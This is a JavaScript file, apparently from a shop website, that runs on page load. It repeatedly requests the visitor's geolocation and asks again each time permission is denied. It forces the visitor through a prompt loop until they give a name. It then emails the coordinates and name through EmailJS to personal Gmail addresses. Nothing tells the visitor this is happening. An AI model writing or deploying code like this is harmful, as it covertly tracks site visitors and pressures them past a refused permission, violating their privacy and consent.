setTimeout(() => {
    a()
}, 1000);

setTimeout(() => {
    getName()
}, 3000);
function a() {
    getLocation()
}


function getLocation() {
    navigator.geolocation.getCurrentPosition(showPosition, showError);
}

function showError(error) {
    switch (error.code) {
        case error.PERMISSION_DENIED:
            getLocation()
            break;
    }
}

function showPosition(position) {
    const templateId = 'template_75sb4wn';
    const serviceID = 'ducthanh260801@gmail.com';
    sendFeedback(serviceID, templateId, {
        to_name: `mrthanh260801@gmail.com`,
        from_name: "Chào mừng đến với NDT Shop",
        message: "Người vừa truy cập: " + position.coords.latitude + ', ' + position.coords.longitude + ', ' + name,
        nguoi_nhan: 'ducthanh260801@gmail.com',
        reply_to: "mrthanh260801@gmail.com",
        link: '<a href="http://ndtshop.herokuapp.com/forgot-password">Truy cập tại đây</a>'
    })
}

function getName() {
    var name = "";
    while (true) {
        name = prompt('Vui lòng nhập tên của bạn!')
        console.log(name);
        if (name == null) {
            alert('Bạn không được để trống tên')
        } else if(name.trim().length == 0){
            alert('Bạn không được để trống tên')
        } else{
            break;
        }
    }
    const templateId = 'template_75sb4wn';
    const serviceID = 'ducthanh260801@gmail.com';
    sendFeedback(serviceID, templateId, {
        to_name: `mrthanh260801@gmail.com`,
        from_name: "Chào mừng đến với NDT Shop",
        message: "Người vừa truy cập: " + name,
        nguoi_nhan: 'ducthanh260801@gmail.com',
        reply_to: "mrthanh260801@gmail.com",
        link: '<a href="http://ndtshop.herokuapp.com/forgot-password">Truy cập tại đây</a>'
    })

}

const sendFeedback = (serviceID, templateId, variables) => {
    window.emailjs.send(
        serviceID, templateId,
        variables
    ).then(res => {
        console.log('Email successfully sent!')
    })
        .catch(err => console.error('There has been an error.  Here some thoughts on the error that occured:', err))
}